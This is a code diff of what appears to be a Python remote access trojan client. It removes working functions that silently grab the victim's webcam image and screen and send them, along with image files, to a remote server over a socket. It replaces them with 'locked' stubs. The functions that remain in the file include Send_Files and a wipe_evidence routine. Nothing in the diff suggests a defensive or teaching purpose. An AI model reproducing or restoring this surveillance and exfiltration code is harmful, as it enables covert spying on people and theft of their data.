@@ -2,8 +2,7 @@ import socket
 import os
 import time
 import subprocess
-from PIL import ImageGrab
-import cv2
+
 #connect Function
 def connect():
 	global s
@@ -90,49 +89,18 @@ def Send_Files():
 			break
 
 def download_images():
-	Name_img=s.recv(1024).decode()
-	full_img=Name_img+".png"
-	while True:
-		img=open(full_img,'rb')
-		img_content=img.read(319488)
-		while img_content != '':
-			s.sendall(img_content)
-			break
-		img.close()
-		break
-
+	print("sorry This One is locked ! ")
 
 
 
 #open The webcam using OpenCv -Python
 def webcam():
-	c=cv2.VideoCapture(0)
-	return_value,image=c.read()
-	cv2.imwrite('camera.png',image)
-	#send The image to The server
-	while True:
-		camera=open('camera.png','rb')
-		i=camera.read(445555)
-		while i != '':
-			s.sendall(i)
-			break
-			#i.read(33937)
-		camera.close()
-		break
+	print("Locked !")
 
 
 #take screenshot 
 def screenshot():
-	ImageGrab.grab().save('screenshot.png')
-	while True:
-		f=open('screenshot.png','rb')
-		i=f.read(64473)
-		while i != '':
-			s.sendall(i)
-			break
-			#i.read(33937)
-		f.close()
-		break
+	print("locked")
 
 def wipe_evidence():
 	try:
